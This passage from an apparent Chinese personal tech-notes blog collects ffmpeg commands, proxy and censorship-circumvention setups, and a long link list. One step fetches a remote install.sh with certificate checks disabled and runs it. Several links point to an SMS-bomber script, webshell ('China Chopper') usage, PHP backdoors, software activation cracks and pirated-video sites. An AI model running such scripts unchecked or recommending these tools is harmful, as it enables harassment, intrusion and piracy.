class="string">-i filename 输入文件 </span></span><br><span class="line"><span class="string">-b bitrate 设置比特率，缺省200kb/s </span></span><br><span class="line"><span class="string">-ss position 搜索到指定的时间 [-]hh:mm:ss[.xxx]的格式也支持。使用-ss参数的作用，可以从指定时间点开始转换任务，-ss后的时间单位为秒 </span></span><br><span class="line"><span class="string">-title string 设置标题（比如PSP中显示影片的标题） </span></span><br><span class="line"><span class="string">-author string 设置作者 </span></span><br><span class="line"><span class="string">-r fps 设置帧频 缺省25 </span></span><br><span class="line"><span class="string">-s size 设置帧大小 格式为W*H 缺省160*128.也可以直接使用简写</span></span><br><span class="line"><span class="string">-ab bitrate 设置音频码率 </span></span><br><span class="line"><span class="string">-ar freq 设置音频采样率 </span></span><br><span class="line"><span class="string">ffmepg常用的方法</span></span><br><span class="line"><span class="string">1.提取音频</span></span><br><span class="line"><span class="string">ffmpeg -i test.mp4 -acodec copy -vn output.aac </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 上面的命令，默认mp4的audio codec是aac,如果不是，可以都转为最常见的aac。 </span></span><br><span class="line"><span class="string">ffmpeg -i test.mp4 -acodec aac -vn output.aac</span></span><br><span class="line"><span class="string">2.视频剪切</span></span><br><span class="line"><span class="string"># 下面的命令，可以从时间为00:00:15开始，截取5秒钟的视频。 </span></span><br><span class="line"><span class="string">ffmpeg -ss 00:00:15 -t 00:00:05 -i input.mp4 -vcodec copy -acodec copy output.mp4 </span></span><br><span class="line"><span class="string"># -ss表示开始切割的时间，-t表示要切多少。上面就是从15秒开始，切5秒钟出来。</span></span><br><span class="line"><span class="string">3.码率控制</span></span><br><span class="line"><span class="string">码率控制对于在线视频比较重要。因为在线视频需要考虑其能提供的带宽。</span></span><br><span class="line"><span class="string">那么，什么是码率？很简单：</span></span><br><span class="line"><span class="string">bitrate = file size / duration 比如一个文件20.8M，时长1分钟，那么，码率就是： biterate = 20.8M bit/60s = 20.810241024*8 bit/60s= 2831Kbps 一般音频的码率只有固定几种，比如是128Kbps， 那么，video的就是 video biterate = 2831Kbps -128Kbps = 2703Kbps</span></span><br><span class="line"><span class="string">那么ffmpeg如何控制码率？</span></span><br><span class="line"><span class="string">ffmpg控制码率有3种选择，-minrate -b:v -maxrate</span></span><br><span class="line"><span class="string">-b:v主要是控制平均码率。 比如一个视频源的码率太高了，有10Mbps，文件太大，想把文件弄小一点，但是又不破坏分辨率。</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -b:v 2000k output.mp4 </span></span><br><span class="line"><span class="string">上面把码率从原码率转成2Mbps码率，这样其实也间接让文件变小了。目测接近一半。 不过，ffmpeg官方wiki比较建议，设置b:v时，同时加上 -bufsize。</span></span><br><span class="line"><span class="string">-bufsize 用于设置码率控制缓冲器的大小，设置的好处是，让整体的码率更趋近于希望的值，减少波动。（简单来说，比如1 2的平均值是1.5， 1.49 1.51 也是1.5, 当然是第二种比较好）</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -b:v 2000k -bufsize 2000k output.mp4</span></span><br><span class="line"><span class="string">-minrate 就简单了，在线视频有时候，希望码率波动，不要超过一个阈值，可以设置maxrate。</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -b:v 2000k -bufsize 2000k -maxrate 2500k output.mp4</span></span><br><span class="line"><span class="string">4.视频编码格式转换</span></span><br><span class="line"><span class="string">比如一个视频的编码是MPEG4，想用H264编码，咋办？</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -vcodec h264 output.mp4 </span></span><br><span class="line"><span class="string"># 相反也一样 </span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -vcodec mpeg4 output.mp4</span></span><br><span class="line"><span class="string">5.视频压缩</span></span><br><span class="line"><span class="string">将输入的1920x1080缩小到960x540输出:</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -vf scale=960:540 output.mp4 </span></span><br><span class="line"><span class="string"># ps: 如果540不写，写成-1，即scale=960:-1, 那也是可以的，ffmpeg会通知缩放滤镜在输出时保持原始的宽高比。</span></span><br><span class="line"><span class="string">6.为视频添加logo</span></span><br><span class="line"><span class="string">想要贴到一个视频上，那可以用如下命令：</span></span><br><span class="line"><span class="string">./ffmpeg -i input.mp4 -i iQIYI_logo.png -filter_complex overlay output.mp4 </span></span><br><span class="line"><span class="string">结果如下所示： 001.jpg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">要贴到其他地方？看下面：</span></span><br><span class="line"><span class="string">右上角： </span></span><br><span class="line"><span class="string">./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=W-w output.mp4 </span></span><br><span class="line"><span class="string">左下角： </span></span><br><span class="line"><span class="string">./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=0:H-h output.mp4 </span></span><br><span class="line"><span class="string">右下角： </span></span><br><span class="line"><span class="string">./ffmpeg -i input.mp4 -i logo.png -filter_complex overlay=W-w:H-h output.mp4</span></span><br><span class="line"><span class="string">7.去掉视频的logo</span></span><br><span class="line"><span class="string">语法：</span></span><br><span class="line"><span class="string">-vf delogo=x:y:w:h[:t[:show]] </span></span><br><span class="line"><span class="string">x:y 离左上角的坐标 </span></span><br><span class="line"><span class="string">w:h logo的宽和高 </span></span><br><span class="line"><span class="string">t: 矩形边缘的厚度默认值4 </span></span><br><span class="line"><span class="string">show：若设置为1有一个绿色的矩形，默认值0。</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -vf delogo=0:0:220:90:100:1 output.mp4 </span></span><br><span class="line"><span class="string">结果如下所示： 002.jpg</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">8.截取视频图像</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -r 1 -q:v 2 -f image2 pic-%03d.jpeg </span></span><br><span class="line"><span class="string"># -r 表示每一秒几帧 </span></span><br><span class="line"><span class="string"># -q:v表示存储jpeg的图像质量，一般2是高质量。 </span></span><br><span class="line"><span class="string">如此，ffmpeg会把input.mp4，每隔一秒，存一张图片下来。假设有60s，那会有60张。</span></span><br><span class="line"><span class="string">可以设置开始的时间，和你想要截取的时间。</span></span><br><span class="line"><span class="string">ffmpeg -i input.mp4 -ss 00:00:20 -t 10 -r 1 -q:v 2 -f image2 pic-%03d.jpeg </span></span><br><span class="line"><span class="string"># -ss 表示开始时间 </span></span><br><span class="line"><span class="string"># -t 表示共要多少时间。 </span></span><br><span class="line"><span class="string">如此，ffmpeg会从input.mp4的第20s时间开始，往下10s，即20~30s这10秒钟之间，每隔1s就抓一帧，总共会抓10帧。</span></span><br><span class="line"><span class="string">干货：多个视频文件或文本文档合并成一个文件</span></span><br><span class="line"><span class="string">001.png 在当前目录下建立一个文本文挡，内容</span></span><br><span class="line"><span class="string">copy /b 1.ts + 2.ts + 3.ts new.ts</span></span><br><span class="line"><span class="string">然后保存，将文本文档后缀改成bat格式。打开即可将目录下的ts文件以二进制顺序合并为new.ts文件。 002.png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">txt文本同样也可以用这种方法合并</span></span><br><span class="line"><span class="string">http://www.golang365.com/#/blog/20</span></span><br></pre></td></tr></table></figure>
<h3 id="命令行科学上网实践"><a href="#命令行科学上网实践" class="headerlink" title="命令行科学上网实践"></a>命令行科学上网实践</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">apt-get install xxxx</span><br><span class="line">listen-address <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">8118</span></span><br><span class="line">forward-socks5 / localhost:<span class="number">1086</span> .</span><br><span class="line">sudo privoxy /usr/local/etc/privoxy/config</span><br><span class="line">netstat -an | grep <span class="number">8118</span></span><br><span class="line"># 效果如下</span><br><span class="line"># tcp4     0    0  127.0.0.1.8118     *.*    LISTEN</span><br><span class="line"># tcp4     0    0  *.8118             *.*    LISTEN</span><br><span class="line">ps -ef | grep privoxy</span><br><span class="line">proxy_on</span><br><span class="line">https:<span class="comment">//sanbaofengs.com/2018/06/25/command-line-proxy/</span></span><br></pre></td></tr></table></figure>
<h3 id="网易云音乐歌曲变灰"><a href="#网易云音乐歌曲变灰" class="headerlink" title="网易云音乐歌曲变灰"></a>网易云音乐歌曲变灰</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/nondanee/UnblockNeteaseMusic.git #克隆项目仓库</span></span><br><span class="line">cd UnblockNeteaseMusic #进入项目根目录</span><br><span class="line">host 里面加入</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> music<span class="number">.163</span>.com</span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> interface.music<span class="number">.163</span>.com</span><br><span class="line">node app.js -p <span class="number">80</span> -f <span class="number">223.252</span><span class="number">.199</span><span class="number">.66</span></span><br><span class="line">重启网易云 https:<span class="comment">//learnku.com/laravel/t/32900</span></span><br></pre></td></tr></table></figure>
<h3 id="如何预览GitHub项目里面的网页"><a href="#如何预览GitHub项目里面的网页" class="headerlink" title="如何预览GitHub项目里面的网页"></a>如何预览GitHub项目里面的网页</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">访问根目录demo.html http:<span class="comment">//xxx.github.io/DEMOs/demo.html</span></span><br><span class="line">在github上demo的仓库页面，点击“setting”按钮；</span><br><span class="line"></span><br><span class="line">找到GitHub Pages版块，选择Source为“master branch”，然后保存</span><br><span class="line"></span><br><span class="line">http:<span class="comment">//htmlpreview.github.io/</span></span><br><span class="line">http:<span class="comment">//rawgit.com/</span></span><br></pre></td></tr></table></figure>
<h3 id="一键反代谷歌和谷歌学术"><a href="#一键反代谷歌和谷歌学术" class="headerlink" title="一键反代谷歌和谷歌学术"></a>一键反代谷歌和谷歌学术</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//v2ex.com/t/247719#reply55 </span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="number">1.</span> wget -N --no-check-certificate https:<span class="comment">//raw.githubusercontent.com/sakz/ngx_google_deployment/master/install.sh</span></span><br><span class="line"><span class="number">2.</span> chmod <span class="number">771</span> ./install.sh</span><br><span class="line"><span class="number">3.</span> bash ./install.sh</span><br><span class="line">https:<span class="comment">//blog.fazero.me/2016/01/19/ngx-google/</span></span><br></pre></td></tr></table></figure>
<h3 id="proxychains在终端使用socks5代理"><a href="#proxychains在终端使用socks5代理" class="headerlink" title="proxychains在终端使用socks5代理"></a>proxychains在终端使用socks5代理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone https:<span class="comment">//github.com/rofl0r/proxychains-ng.git</span></span><br><span class="line">cd proxychains-ng</span><br><span class="line">./configure</span><br><span class="line">make &amp;&amp; make install</span><br><span class="line">cp ./src/proxychains.conf /etc/proxychains.conf</span><br><span class="line">cd .. &amp;&amp; rm -rf proxychains-ng</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line"></span><br><span class="line">socks5 <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br><span class="line">需要代理的命令前加上 proxychains4 ，如：</span><br><span class="line"></span><br><span class="line">proxychains4 wget http:<span class="comment">//xxx.com/xxx.zip</span></span><br><span class="line">https:<span class="comment">//blog.fazero.me/2015/08/31/%E5%88%A9%E7%94%A8proxychains%E5%9C%A8%E7%BB%88%E7%AB%AF%E4%BD%BF%E7%94%A8socks5%E4%BB%A3%E7%90%86/</span></span><br></pre></td></tr></table></figure>
<h3 id="免费获取歌词"><a href="#免费获取歌词" class="headerlink" title="免费获取歌词"></a>免费获取歌词</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//geci.me/api/lyric/海阔天空  </span></span><br><span class="line">http:<span class="comment">//geci.me/api/lyric/海阔天空/Beyond</span></span><br><span class="line">http:<span class="comment">//geci.me/api/cover/1573814 根据专辑编号获取专辑封面URL</span></span><br><span class="line"></span><br><span class="line">https:<span class="comment">//hacpai.com/article/1364440883834</span></span><br></pre></td></tr></table></figure>
<h3 id="Deepin-系统科学上网-PAC-自动代理"><a href="#Deepin-系统科学上网-PAC-自动代理" class="headerlink" title="Deepin 系统科学上网 PAC 自动代理"></a>Deepin 系统科学上网 PAC 自动代理</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip3 install genpac</span><br><span class="line">genpac --pac-compress --pac-proxy <span class="string">'SOCKS5 127.0.0.1:1080'</span> --format pac  -o ~<span class="regexp">/auto.pac</span></span><br><span class="line"><span class="regexp">设置系统代理，设置 &gt; 网络 &gt; 系统代理 &gt; 自动</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">配置 URL：</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">file:/</span><span class="comment">//home/登录用户名/auto.pac</span></span><br><span class="line">https:<span class="comment">//gleehub.com/tool/deepin-xi-tong-ke-xue-shang-wang-pac-zi-dong-dai-li.html</span></span><br></pre></td></tr></table></figure>
<h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="keyword">export</span> GOPROXY=https:<span class="comment">//goproxy.cn</span></span><br><span class="line">$ echo <span class="string">"export GOPROXY=https://goproxy.cn"</span> &gt;&gt; ~<span class="regexp">/.profile &amp;&amp; source ~/</span>.profile</span><br><span class="line">打开你的 PowerShell 并执行：</span><br><span class="line"></span><br><span class="line">C:\&gt; $env:GOPROXY = <span class="string">"https://goproxy.cn"</span></span><br><span class="line">或者</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span> 打开“开始”并搜索“env”</span><br><span class="line"><span class="number">2.</span> 选择“编辑系统环境变量”</span><br><span class="line"><span class="number">3.</span> 点击“环境变量…”按钮</span><br><span class="line"><span class="number">4.</span> 在“&lt;你的用户名&gt; 的用户变量”章节下（上半部分）</span><br><span class="line"><span class="number">5.</span> 点击“新建…”按钮</span><br><span class="line"><span class="number">6.</span> 选择“变量名”输入框并输入“GOPROXY”</span><br><span class="line"><span class="number">7.</span> 选择“变量值”输入框并输入“https:<span class="comment">//goproxy.cn”</span></span><br><span class="line"><span class="number">8.</span> 点击“确定”按钮</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/37926</span></span><br></pre></td></tr></table></figure>
<p>豆丁网文档复制抓取工具 <a href="https://www.docin365.com/" target="_blank" rel="noopener">https://www.docin365.com/</a> </p>
<p>上学吧365答案查询工具 <a href="https://www.shangxueba365.com/" target="_blank" rel="noopener">https://www.shangxueba365.com/</a></p>
<p>为什么要自己搭建翻墙服务？ <a href="https://github.com/xiaoming2028/kexueshangwang/wiki" target="_blank" rel="noopener">https://github.com/xiaoming2028/kexueshangwang/wiki</a></p>
<p><a href="https://workers.cloudflare.com/" target="_blank" rel="noopener">https://workers.cloudflare.com/</a> <a href="https://etherdream.github.io/jsproxy/" target="_blank" rel="noopener">https://etherdream.github.io/jsproxy/</a><br>Google代理 <a href="https://noisy-tooth-2ee5.susheng.workers.dev/" target="_blank" rel="noopener">https://noisy-tooth-2ee5.susheng.workers.dev/</a><br>  摸鱼网站整理<a href="https://withpinbox.com/explore/collection/266629" target="_blank" rel="noopener">https://withpinbox.com/explore/collection/266629</a><br> 短信轰炸机脚本TBomb <a href="https://github.com/TheSpeedX/TBomb" target="_blank" rel="noopener">https://github.com/TheSpeedX/TBomb</a></p>
<p>在线模拟vim <a href="https://www.openvim.com/" target="_blank" rel="noopener">https://www.openvim.com/</a></p>
<p>免费的定时任务托管 clock.sh  <a href="https://github.com/clock-sh/ticket" target="_blank" rel="noopener">https://github.com/clock-sh/ticket</a> <a href="https://github.com/yehux/Coot" target="_blank" rel="noopener">https://github.com/yehux/Coot</a></p>
<p><a href="http://fonts.safe.360.cn/360" target="_blank" rel="noopener">http://fonts.safe.360.cn/360</a> 有一个查询字体版权的网站。</p>
<p>妹子图站技术方案<a href="https://sssis.me/post/meizitu.html" target="_blank" rel="noopener">https://sssis.me/post/meizitu.html</a> <a href="https://qingbuyaohaixiu.com/" target="_blank" rel="noopener">https://qingbuyaohaixiu.com/</a></p>
<p>各种App、小程序、网站的请求签名算法。 现已有：自如、小红书、蛋壳公寓 <a href="https://github.com/gadfly0x/signature_algorithm" target="_blank" rel="noopener">https://github.com/gadfly0x/signature_algorithm</a> 逆向App用的都是iOS</p>
<p>某JS最牛加密脱壳解密破解去混淆工具<a href="https://www.qs5.org/Post/673.html" target="_blank" rel="noopener">https://www.qs5.org/Post/673.html</a> <a href="https://cn.v2ex.com/t/596794#reply28" target="_blank" rel="noopener">https://cn.v2ex.com/t/596794#reply28</a></p>
<p><a href="http://www.sojson.com" target="_blank" rel="noopener">www.sojson.com</a> 网站高级JS加密破解 <a href="https://github.com/insoxin/sojson.v5" target="_blank" rel="noopener">https://github.com/insoxin/sojson.v5</a> <a href="https://obfuscator.io/" target="_blank" rel="noopener">https://obfuscator.io/</a><br><a href="https://github.com/javascript-obfuscator/javascript-obfuscator/" target="_blank" rel="noopener">https://github.com/javascript-obfuscator/javascript-obfuscator/</a> <a href="https://cn.v2ex.com/t/597018#reply10" target="_blank" rel="noopener">https://cn.v2ex.com/t/597018#reply10</a></p>
<p>翻墙<a href="https://github.com/txthinking/brook" target="_blank" rel="noopener">https://github.com/txthinking/brook</a>  jsproxy  可以一键脚本部署的呀, 前端页面可以放在 github pages 上面. 也提供了 cloudflare workers <a href="https://workers.cloudflare.com/" target="_blank" rel="noopener">https://workers.cloudflare.com/</a>  的部署方法, 比如说这个是我搭的 <a href="https://proxy.jimmytinsley.workers.dev/" target="_blank" rel="noopener">https://proxy.jimmytinsley.workers.dev/</a><br><a href="https://github.com/EtherDream/jsproxy/tree/master/cf-worker" target="_blank" rel="noopener">https://github.com/EtherDream/jsproxy/tree/master/cf-worker</a><br><a href="https://github.com/aploium/zmirror" target="_blank" rel="noopener">https://github.com/aploium/zmirror</a><br><a href="https://github.com/aploium/zmirror-onekey" target="_blank" rel="noopener">https://github.com/aploium/zmirror-onekey</a><br>一键部署脚本 Google镜像<a href="https://g.zmirrordemo.com/" target="_blank" rel="noopener">https://g.zmirrordemo.com/</a><br><a href="https://fetch.ffeii.workers.dev/https://google.com" target="_blank" rel="noopener">https://fetch.ffeii.workers.dev/https://google.com</a><br><a href="https://github.com/You2php/you2php" target="_blank" rel="noopener">https://github.com/You2php/you2php</a><br><a href="https://noisy-tooth-2ee5.susheng.workers.dev/-----https://google.com" target="_blank" rel="noopener">https://noisy-tooth-2ee5.susheng.workers.dev/-----https://google.com</a><br><a href="https://proxy.zme.ink/www.google.com/search" target="_blank" rel="noopener">https://proxy.zme.ink/www.google.com/search</a><br>一键部署Google等镜像 – zmirror<a href="https://uixsj.cn/1706.html" target="_blank" rel="noopener">https://uixsj.cn/1706.html</a><br>利用 cloudflare workers 加速<br>wget <a href="https://fetch.ffeii.workers.dev/https://www.openssl.org/source/openssl-1.1.1c.tar.gz" target="_blank" rel="noopener">https://fetch.ffeii.workers.dev/https://www.openssl.org/source/openssl-1.1.1c.tar.gz</a><br>HTTP请求代理，CORS跨域请求，HTTPS支持<a href="https://proxy.netnr.com/" target="_blank" rel="noopener">https://proxy.netnr.com/</a>  <a href="https://proxy.zme.ink/www.google.com" target="_blank" rel="noopener">https://proxy.zme.ink/www.google.com</a><br><a href="https://github.com/Rob--W/cors-anywhere" target="_blank" rel="noopener">https://github.com/Rob--W/cors-anywhere</a><br><a href="https://cors-anywhere.herokuapp.com/https://google.com" target="_blank" rel="noopener">https://cors-anywhere.herokuapp.com/https://google.com</a><br>VPN翻墙教程 <a href="https://mp.weixin.qq.com/s/tE_XRsQOCutfGFjrx3UHrg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/tE_XRsQOCutfGFjrx3UHrg</a><br>项目主页： <a href="https://you2php.github.io" target="_blank" rel="noopener">https://you2php.github.io</a> （需要梯子）<br>项目地址： <a href="https://github.com/You2php" target="_blank" rel="noopener">https://github.com/You2php</a> <a href="https://sphard2.github.io/gfw/free/ssr.html" target="_blank" rel="noopener">https://sphard2.github.io/gfw/free/ssr.html</a><br>一个简单的PHP Web代理<a href="https://github.com/joshdick/miniProxy" target="_blank" rel="noopener">https://github.com/joshdick/miniProxy</a><br>为什么要自己搭建翻墙服务？ <a href="https://github.com/xiaoming2028/kexueshangwang/wiki" target="_blank" rel="noopener">https://github.com/xiaoming2028/kexueshangwang/wiki</a><br><a href="https://github.com/EtherDream/jsproxy" target="_blank" rel="noopener">翻墙</a></p>
<p><a href="https://codidate.com/code/sandbox" target="_blank" rel="noopener">在线技术面试平台showmebug</a></p>
<p><a href="https://latexsearch.arnavbansal.dev/" target="_blank" rel="noopener">LaTeX 搜索引擎</a></p>
<p><a href="https://github.com/dxcweb/watermark" target="_blank" rel="noopener"> canvas图片水印</a></p>
<p><a href="https://github.com/selierlin/Share-SSR-V2ray" target="_blank" rel="noopener">SS/SSR/V2ray 免费google分享节点账号信息网站</a></p>
<p><a href="https://github.com/zhaipro/easy12306" target="_blank" rel="noopener">12306识别验证码http://shell.teachx.cn:12306/</a></p>
<p><a href="https://bpteach.github.io/New-Media-Toolbox/" target="_blank" rel="noopener">新媒体工具箱</a></p>
<p><a href="https://only-free.github.io/2018/12/24/gayhub-shang-de-gong-ju-ji-he/" target="_blank" rel="noopener">github上的工具集合子域名枚举扫描器或爆破工具</a></p>
<p><a href="https://csuwangj.github.io/CTF%E8%BD%BB%E5%B7%A5%E5%85%B7%E4%B8%AA%E4%BA%BA%E9%9B%86%E5%90%88/" target="_blank" rel="noopener">ctf工具 </a></p>
<p><a href="http://tool.yovisun.com/scihub/" target="_blank" rel="noopener">工具集SCI-Hub科研论文网址 google镜像</a></p>
<p><a href="http://factordb.com" target="_blank" rel="noopener">在线分解质因子数学题</a></p>
<p><a href="https://tiansh.github.io/us-weibo/Weibo_Supervisor_Blacklist_Tool/" target="_blank" rel="noopener">微博监督员批量拉黑工具</a></p>
<p><a href="https://fly8wo.github.io/2018/08/24/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E4%B9%8B%E7%B1%BB%E8%8F%9C%E5%88%80%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/" target="_blank" rel="noopener">中国菜刀之类菜刀工具的使用</a></p>
<p><a href="http://einverne.github.io/post/2019/01/html-to-pdf.html" target="_blank" rel="noopener">html 转 pdf 命令行工具 wkhtmltopdf </a></p>
<p><a href="https://github.com/XX-net/XX-Net/wiki" target="_blank" rel="noopener">翻墙工具google</a></p>
<p><a href="http://jartto.wang/2019/04/15/amusing-ppt/" target="_blank" rel="noopener">酷炫的 HTML5 网页 PPT</a></p>
<p><a href="https://post.zz173.com/detail/hfu17Yn_YpMY9TlVNTqv8w.html" target="_blank" rel="noopener">一个有意思的解密</a></p>
<p><a href="https://me.jinchuang.org/archives/177.html" target="_blank" rel="noopener">好用的office/windows激活工具</a></p>
<p><a href="http://nullpointer.pw/Charles%E6%8A%93%E5%8C%85%E5%AE%9E%E6%88%98%E8%AF%A6%E8%A7%A3.html" target="_blank" rel="noopener">Charles抓包修改APP数据</a></p>
<p><a href="https://github.com/bartaz/impress.js/" target="_blank" rel="noopener">impress.js制作ppt www.caiqianyu.com/impress/impress.html#/step-14</a></p>
<p><a href="https://github.com/jc91715/oc-plugin-music" target="_blank" rel="noopener">听全网音乐</a></p>
<p><a href="https://learnku.com/articles/30329" target="_blank" rel="noopener">持续更新免费的 API github.com/fangzesheng/free-api</a></p>
<p><a href="https://shimo.im/docs/hLgSj9sYasQkrvO1/read" target="_blank" rel="noopener">语音快速转文字www.luyinla.com/luyinla.html</a></p>
<p><a href="https://gugeji.com/" target="_blank" rel="noopener">Google代理</a></p>
<p><a href="https://elemefe.github.io/sip/charles/ctrl-req.html" target="_blank" rel="noopener">修改Charles网络请求</a></p>
<p><a href="https://github.com/ctfs/write-ups-2017" target="_blank" rel="noopener">write-ups-2017</a></p>
<p><a href="https://axutongxue.github.io/2019/01/27/%E7%9C%8B%E5%AE%8C%E8%BF%99%E7%AF%87%E6%95%99%E7%A8%8B%EF%BC%8C%E5%86%8D%E6%B2%A1%E6%9C%89%E4%B8%8B%E8%BD%BD%E4%B8%8D%E4%BA%86%E7%9A%84%E7%BD%91%E9%A1%B5%E8%A7%86%E9%A2%91/" target="_blank" rel="noopener">视频下载</a></p>
<p><a href="https://github.com/cnlh/nps" target="_blank" rel="noopener">功能强大的内网穿透代理服务器</a></p>
<p><a href="https://phithon.gitbooks.io/conote/content/" target="_blank" rel="noopener">渗透测试</a></p>
<p><a href="https://www.itcodemonkey.com/article/4956.html" target="_blank" rel="noopener">奇淫异巧之 PHP 后门</a></p>
<p><a href="http://www.jeyzhang.com/how-to-install-and-setup-shadowsocks-client-in-different-os.html" target="_blank" rel="noopener">各种系统下Shadowsocks客户端的安装与配置</a></p>
<p><a href="https://vien.tech/article/137" target="_blank" rel="noopener">免费ss、ssr账号分享，Shadowsocks免费账号</a></p>
<p><a href="https://monitor.firefox.com/" target="_blank" rel="noopener"> 查询自己邮箱密码是否泄漏</a></p>
<p><a href="https://learnku.com/articles/29171" target="_blank" rel="noopener">带着小白了解下比特币区块链技术</a></p>
<p><a href="http://kyon945.ys168.com/" target="_blank" rel="noopener">精选资源</a></p>
<p><a href="https://send.firefox.com/" target="_blank" rel="noopener">私密的文件分享</a></p>
<p><a href="https://axutongxue.github.io/2019/04/08/%E4%BB%8E%E6%89%8B%E6%9C%BA%E5%88%B0%E7%94%B5%E8%84%91%EF%BC%8C%E7%A9%B6%E7%AB%9F%E5%93%AA%E6%AC%BEOCR%E5%9B%BE%E7%89%87%E6%96%87%E5%AD%97%E8%AF%86%E5%88%AB%E8%BD%AF%E4%BB%B6%E6%9C%80%E5%A5%BD%E7%94%A8%EF%BC%9F/" target="_blank" rel="noopener">OCR图片文字识别</a></p>
<p><a href="https://cowtransfer.com/" target="_blank" rel="noopener">文件中转http://tmp.link/</a></p>
<p><a href="https://michael728.github.io/tools/" target="_blank" rel="noopener">分享发现的好资源，好工具</a></p>
<p><a href="http://chromecj.com/" target="_blank" rel="noopener">chrome插件下载https://www.chromefor.com/</a></p>
<p><a href="http://md.aclickall.com/" target="_blank" rel="noopener">知乎markdown</a></p>
<p><a href="https://michael728.github.io/2019/04/27/tools-ss-vps/" target="_blank" rel="noopener">ss翻墙</a></p>
<p><a href="https://michael728.github.io/2015/11/28/tools-list-win/" target="_blank" rel="noopener">Windows上那些值得推荐的良心软件</a></p>
<p><a href="https://mp.weixin.qq.com/s/EtoNa6o0GDuOz8o1mOlK7w" target="_blank" rel="noopener">黑科技工具</a></p>
<p><a href="https://www.freedownloadmanager.org/zh/" target="_blank" rel="noopener">下载工具fdm</a></p>
<p><a href="http://yurl.sinaapp.com/crx.php" target="_blank" rel="noopener">Chrome商店Crx离线安装包下载</a></p>
<p><a href="https://finthon.com/google-fan-qiang/" target="_blank" rel="noopener">通过谷歌云（GCP）免费科学上网一年https://www.wmsoho.com/google-cloud-platform-ssr-bbr-tutorial/</a></p>
<p><a href="https://rss.anyant.com/" target="_blank" rel="noopener">订阅网站更新</a></p>
<p><a href="http://vidlery.com/" target="_blank" rel="noopener">动画短片素材网站-Vidlery</a></p>
<p><a href="http://111jx.xyz/?url=" target="_blank" rel="noopener">vip视频免费看</a></p>
<p><a href="https://phpartisan.cn/news/121.html" target="_blank" rel="noopener">Frp实现内网穿透</a></p>
<p><a href="https://hacpai.com/article/1517986403240" target="_blank" rel="noopener">vip无广告电影 黑客派</a></p>
<p><a href="https://chvin.github.io/react-tetris/" target="_blank" rel="noopener">在线版俄罗斯方块</a></p>
